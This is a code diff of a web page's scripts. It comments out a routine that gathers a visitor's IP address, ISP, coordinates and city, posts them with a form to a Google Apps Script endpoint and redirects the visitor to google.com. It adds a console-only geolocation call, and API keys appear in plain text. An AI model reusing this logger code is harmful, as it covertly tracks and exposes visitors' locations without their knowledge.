@@ -24,50 +24,60 @@
 
 <div id="success">Success</div>
 <script>
-         _ipgeolocation.enableSessionStorage(true);
+
+$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=41d98d1e3da7400191cfa0dce2ababed', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+
+
+
+
+
+        //  _ipgeolocation.enableSessionStorage(true);
     
-         var ip = sessionStorage.getItem("ip");
-         var country_name = sessionStorage.getItem("country_name");
-         var district = sessionStorage.getItem("district");
-         var isp = sessionStorage.getItem("isp");
-         var city = sessionStorage.getItem("city");
-         var latitude = sessionStorage.getItem("latitude");
-         var longitude = sessionStorage.getItem("longitude");
+        //  var ip = sessionStorage.getItem("ip");
+        //  var country_name = sessionStorage.getItem("country_name");
+        //  var district = sessionStorage.getItem("district");
+        //  var isp = sessionStorage.getItem("isp");
+        //  var city = sessionStorage.getItem("city");
+        //  var latitude = sessionStorage.getItem("latitude");
+        //  var longitude = sessionStorage.getItem("longitude");
                 
-             _ipgeolocation.makeAsyncCallsToAPI(false);
-             _ipgeolocation.setFields("country_name,district,isp,city,latitude,longitude");
-             _ipgeolocation.getGeolocation(handleResponse, "4d8828d1407a4c8eb406f5620c6a4a5c");
+        //      _ipgeolocation.makeAsyncCallsToAPI(false);
+        //      _ipgeolocation.setFields("country_name,district,isp,city,latitude,longitude");
+        //      _ipgeolocation.getGeolocation(handleResponse, "4d8828d1407a4c8eb406f5620c6a4a5c");
     
-         function handleResponse(json) {
-             ip = json.ip;
-             country_name = json.country_name;
-             district = json.district;
-             isp = json.isp;
-             city = json.city;
-             latitude = json.latitude;
-             longitude = json.longitude;
-         }
+        //  function handleResponse(json) {
+        //      ip = json.ip;
+        //      country_name = json.country_name;
+        //      district = json.district;
+        //      isp = json.isp;
+        //      city = json.city;
+        //      latitude = json.latitude;
+        //      longitude = json.longitude;
+        //  }
                     
-         $(document).ready(function() {
-            var a = document.getElementById("ip-details").value = ("IP address : " +  ip + "\n" + "ISP Provider : " + isp + "\n" + "Latitude : " + latitude + "\n" + "Longitude : " + longitude + "\n" +  "Neigbourhood : " + district + "\n" + "City : " + city + "\n" + "Country : " + country_name);
-         });
+        //  $(document).ready(function() {
+        //     var a = document.getElementById("ip-details").value = ("IP address : " +  ip + "\n" + "ISP Provider : " + isp + "\n" + "Latitude : " + latitude + "\n" + "Longitude : " + longitude + "\n" +  "Neigbourhood : " + district + "\n" + "City : " + city + "\n" + "Country : " + country_name);
+        //  });
         </script>
         
     <script>
-        function myFunction() {
-          document.getElementById("ip-details").value = a;
-        }
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzqEO6r_szgLDtGwGsZGORUmFNGhJBH6axrYUBfmeZhz7_S41p2/exec'
-    const form = document.forms['data']
+    //     function myFunction() {
+    //       document.getElementById("ip-details").value = a;
+    //     }
+    //     const scriptURL = 'https://script.google.com/macros/s/AKfycbzqEO6r_szgLDtGwGsZGORUmFNGhJBH6axrYUBfmeZhz7_S41p2/exec'
+    // const form = document.forms['data']
   
-    form.addEventListener('submit', e => {
-      e.preventDefault()
-      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-        .then(response => window.location.replace("https://google.com"))
-        .catch(error => console.error('Error!', error.message))
-        document.querySelector('#success').style.display = 'block';
-        document.querySelector('#data').style.display = 'none';
-	})
+    // form.addEventListener('submit', e => {
+    //   e.preventDefault()
+    //   fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    //     .then(response => window.location.replace("https://google.com"))
+    //     .catch(error => console.error('Error!', error.message))
+    //     document.querySelector('#success').style.display = 'block';
+    //     document.querySelector('#data').style.display = 'none';
+	// })
         </script>
 </body>
 </html>
